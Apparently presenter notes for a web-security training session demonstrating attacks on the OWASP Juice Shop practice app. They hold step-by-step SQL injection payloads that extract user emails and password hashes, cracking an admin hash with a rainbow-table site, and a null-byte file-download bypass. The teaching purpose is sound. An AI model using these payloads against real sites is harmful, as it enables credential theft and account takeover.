# Demo 1: SQL Injection obtaining user list
Source: https://pwning.owasp-juice.shop/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection

1. Find the search URL in network tab
2. Unimplemented logic
3. Test with query
4. Let's terminate the query `'))--` 
5. Let's try a UNION select to get more data `')) UNION SELECT * FROM x--`, Notice that descriptive errors help our attack
6. First try users `')) UNION SELECT * FROM Users--`
7. `')) UNION SELECT '1' FROM Users--`
8. `')) UNION SELECT '1','2' FROM Users--`
9. Skip ahead `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--` we see no data yet do to union not matching.
10. Lets get rid of the data `qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--`
11. `qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--` guess names, or use other means.

# Demo 2: Show rainbow tables with leaked users
1. Get hash for admin from rest endpoint.
2. Put hash in https://crackstation.net/
3. See admin password & login

# Demo 3: Discuss the greatest crossword puzzle
1. Hack from adobe, passwords were not salted
2. Hashed in 8 bit blocks
3. As a result you could know what range the length of the password was in
4. The same passwords resulted in the same hash
5. Meaning you had multiple hints

# Demo 4: Misconfigurations
1. Go to about page
2. Inspect source link to FTP
3. Try and download something
4. Use Null Byte `%2500.md` to download the file